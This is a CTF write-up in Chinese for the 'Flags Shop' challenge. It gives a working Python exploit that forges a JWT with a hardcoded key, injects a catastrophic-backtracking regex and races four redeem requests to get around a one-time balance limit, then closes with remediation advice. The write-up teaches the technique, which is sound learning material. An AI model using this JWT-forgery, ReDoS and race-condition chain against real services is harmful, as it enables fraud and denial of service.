# Flags Shop

## 题目简述

注册用户初始余额为 10，兑换 ticket 可增加 10，但账号只能兑换一次；真实 flag 售价 40.99，正常流程无法购买。JWT 中包含服务端用于校验 ticket 的正则表达式，而签名密钥在源码中硬编码为 `chickencurry`。

利用思路是伪造 JWT，把 `ticket_regex` 改成耗时但最终能匹配成功的灾难性回溯表达式，再并发发送兑换请求。每个 Gunicorn worker 都会在状态仍为“未兑换”时通过第一次检查，然后一起阻塞在正则匹配；恢复后它们不会重新检查状态，会分别增加余额。

## 解题过程

兑换逻辑为：

```python
if checkRedeem(username) and checkTicket(regex, ticket):
    userRedeem(username)
```

Python 的 `and` 从左向右求值。`checkRedeem()` 读取 `users.json` 确认 `redeemed` 为假，`checkTicket()` 随后执行攻击者通过 JWT 提供的正则：

```python
def checkTicket(regex, ticket):
    return re.match(regex, ticket)
```

应用由 4 个 Gunicorn worker 提供服务。使用 `(.*a){24}` 匹配 28 个 `a` 会产生大量可能的分组方式，迫使正则引擎回溯，同时最终仍然匹配成功。让四个请求同时进入正则阶段后，它们都已经通过了 `checkRedeem()`；第一个请求设置 `redeemed=True` 时，其余请求不会回头检查，仍会继续调用 `userRedeem()`。

先注册新用户，再用已知 HS256 密钥签发包含恶意正则的 token：

```python
import concurrent.futures
import threading
import time

import jwt
import requests

base = "http://127.0.0.1:1337"
username = f"race-{int(time.time())}"
password = "wp-test-password"

requests.post(
    base + "/register",
    data={"username": username, "password": password},
)

token = jwt.encode(
    {
        "username": username,
        "ticket_regex": "(.*a){24}",
    },
    "chickencurry",
    algorithm="HS256",
)
cookies = {"token": token}

barrier = threading.Barrier(4)

def redeem_once(_):
    barrier.wait()
    return requests.post(
        base + "/redeem",
        data={"ticket": "a" * 28},
        cookies=cookies,
        timeout=60,
    ).status_code

with concurrent.futures.ThreadPoolExecutor(max_workers=4) as pool:
    print(list(pool.map(redeem_once, range(4))))

r = requests.get(base + "/buy-flag/3", cookies=cookies)
print(r.text)
```

余额从 10 增长到至少 50，足以购买 40.99 的第三项，页面返回：

```text
shellmates{Jwt_X_r3d0s_b3ats_3v3ryth1ng}
```

竞态是否稳定取决于部署调度。若部分请求没有同时通过检查，应使用新账号重试并先确认四个请求确实并发到达，不能在已经标记为 redeemed 的旧账号上顺序重放。

## 方法总结

本题把三个缺陷串在一起：可恢复或直接泄露的 JWT 对称密钥允许伪造受信任字段；用户可控正则造成 ReDoS 式延迟；检查与写入不具备原子性，使延迟窗口转化为 TOCTOU 竞态。单独增加一次兑换标志并不能阻止并发请求，因为判断与更新之间存在可控耗时操作。

修复应使用服务端固定的 ticket 规则，绝不从客户端 token 读取可执行正则；签名密钥应随机生成并安全管理。兑换过程还必须放入数据库事务，通过条件更新或行锁原子地完成“未兑换 → 已兑换并加余额”，并用唯一约束保证一次性 ticket 无法重复消费。
